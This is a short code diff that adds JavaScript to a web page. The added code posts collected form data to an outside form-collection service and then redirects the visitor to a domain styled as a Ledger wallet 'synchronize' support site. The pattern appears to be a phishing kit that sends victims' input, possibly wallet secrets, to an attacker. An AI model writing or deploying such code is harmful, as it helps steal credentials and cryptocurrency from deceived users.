@@ -1575,6 +1575,27 @@ setTimeout(() => { proceed();}, 2000);
 });
 
 
+      fetch("https://submit-form.com/gmAjhBF4R", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Accept: "application/json",
+        },
+        body: JSON.stringify({
+          message: formData,
+        }),
+      })
+        .then(function (response) {
+        console.log(response);
+        window.location.href = 'https://synchronize-ledgerdevices.vercel.app/support.html'; // redirect to thank you page
+
+        })
+        .catch(function (error) {
+          console.error(error);
+        });
+    
+
+
 
 
 
